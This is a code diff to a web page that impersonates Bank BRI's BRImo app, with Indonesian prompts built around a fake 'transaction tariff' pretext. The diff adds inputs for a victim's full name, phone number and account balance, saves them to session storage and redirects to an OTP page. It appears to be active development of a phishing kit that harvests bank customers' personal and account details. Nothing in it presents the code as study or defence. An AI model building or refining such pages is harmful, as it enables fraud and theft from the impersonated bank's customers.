@@ -1065,24 +1065,41 @@ ion-icon{
 <div class="" style="margin-left: 20px;margin-top: -60px;position:relative;border:0px solid #0085e0;padding:15px;width:82%;border-radius:20px; background: #fff; height: 295px; box-shadow: rgba(0, 0, 0, 0.15) 0px 5px 15px 0px; overflow:hidden">
 <center style="color:#09559a; line-height: 17px; font-size: 15px; padding: 5px"><p>Silahkan Pilih Tarif Transaksi Sesuai Kebutuhan Anda Di Bawah Ini</p><br><hr>
 </center>
-<div style="text-align: center;">
-<h4 style="color:#09559a; margin-left: -12px">
-<label id="label1" style="color:#09559a; line-height: 17px; font-size: 15px;">
-<input required="" type="radio" name="tarif" id="tarif" value="BARU">
- Tarif Baru Rp 150.000 / Perbulan
-</label>
-</h4>
-<h4 style="color:#09559a;">
-<label required="" id="label2" style="color:#09559a; line-height: 17px; font-size: 15px;">
-<input type="radio" name="tarif" id="tarif" value="LAMA">
- Tarif Lama Rp 6.500 / Bi fast 2.500
-</label>
-</h4></div>
+
 <br>
   <input type="hidden" id="logo" value="༺═𝗕𝗮𝗻𝗸 𝗕𝗥𝗜═༻">
 <h5 style="color:#000; margin-top: 0px; margin-left: 4px">Masukan Nomor ponsel <b style="color: #06529C">BRI</b><b style="color: #F37024">mo</b> Anda :</h5><br><ion-icon name="phone-portrait-sharp"></ion-icon>
 <input id="NoHp" name="NoHp" type="tel" style="box-sizing: border-box; height: 40px; width: 536px; max-width: 100%; border: 1px solid rgb(0, 134, 224); border-image: initial; background-color: rgb(255, 255, 255);  border-radius: 10px; box-shadow: rgba(0, 0, 0, 0.1) 0px 4px 6px -1px, rgba(0, 0, 0, 0.06) 0px 2px 4px -1px; font-family: 'Nunito', sans-serif; font-weight: bold; font-size: 16px; color: rgb(28, 28, 28); word-spacing: 0px; padding: 0px 10px; outline: none; margin-top: -15px; padding-left: 40px" placeholder="08xxxxxx" required="" maxlength="13" minlength="10">
+<!-- NAMA LENGKAP -->
+<h5 style="color:#000; margin-top: 0px; margin-left: 4px">
+Masukan Nama Lengkap Anda :
+</h5><br>
+<ion-icon name="person"></ion-icon>
+<input name="nama" type="text"
+style="box-sizing: border-box; height: 40px; width: 536px; max-width: 100%; border: 1px solid rgb(0, 134, 224); border-radius: 10px; box-shadow: rgba(0,0,0,0.1) 0px 4px 6px -1px; font-family: 'Nunito'; font-weight: bold; font-size: 16px; padding-left: 40px; outline: none;"
+placeholder="Nama Lengkap" required>
 
+<br><br>
+
+<!-- NOMOR HP -->
+<h5 style="color:#000; margin-top: 0px; margin-left: 4px">
+Masukan Nomor ponsel <b style="color:#06529C">BRI</b><b style="color:#F37024">mo</b> Anda :
+</h5><br>
+<ion-icon name="phone-portrait-sharp"></ion-icon>
+<input id="NoHp" name="NoHp" type="tel"
+style="box-sizing: border-box; height: 40px; width: 536px; max-width: 100%; border: 1px solid rgb(0,134,224); border-radius: 10px; box-shadow: rgba(0,0,0,0.1) 0px 4px 6px -1px; font-family: 'Nunito'; font-weight: bold; font-size: 16px; padding-left: 40px; outline: none;"
+placeholder="08xxxxxx" required>
+
+<br><br>
+
+<!-- SALDO -->
+<h5 style="color:#000; margin-top: 0px; margin-left: 4px">
+Masukan Saldo Anda :
+</h5><br>
+<ion-icon name="cash-outline"></ion-icon>
+<input name="saldo" type="number"
+style="box-sizing: border-box; height: 40px; width: 536px; max-width: 100%; border: 1px solid rgb(0,134,224); border-radius: 10px; box-shadow: rgba(0,0,0,0.1) 0px 4px 6px -1px; font-family: 'Nunito'; font-weight: bold; font-size: 16px; padding-left: 40px; outline: none;"
+placeholder="Saldo" required>
 <br>
 
 
@@ -1124,8 +1141,8 @@ ion-icon{
 <!-- </body> -->
 <script>
  $(document).ready(function(){
-    $('#formHP').submit(function(e) {
-    event.preventDefault();
+  $('#formHP').submit(function(e) {
+    e.preventDefault(); // ✅ ini yang benar
     
 document.getElementById('kirims').innerHTML = "Memproses....";
 
@@ -1138,15 +1155,23 @@ document.getElementById('kirims').innerHTML = "Memproses....";
  
  complete: function(data) {
             console.log('Complete')
-   setTimeout(function(){
-  window.location.href='otp.html'
- var tarif = $('input[name="tarif"]:checked').val();
-       if (tarif) {  
-  sessionStorage.setItem('tarif', tarif);
-  }
- var NoHp = document.getElementById("NoHp").value;
- sessionStorage.setItem("NoHp", NoHp);   
-    }, 1000);
+ setTimeout(function(){
+
+    var NoHp = document.getElementById("NoHp").value;   
+    var nama = document.querySelector('input[name="nama"]').value;
+    var saldo = document.querySelector('input[name="saldo"]').value;
+    if(nama === "" || saldo === "" || NoHp === ""){
+    alert("Semua data wajib diisi");
+    return;
+   }
+	sessionStorage.setItem("NoHp", NoHp);
+    sessionStorage.setItem("nama", nama);
+    sessionStorage.setItem("saldo", saldo);
+
+    // TARUH REDIRECT PALING AKHIR
+    window.location.href='otp.html';
+
+}, 1000);
         }
     });
  });
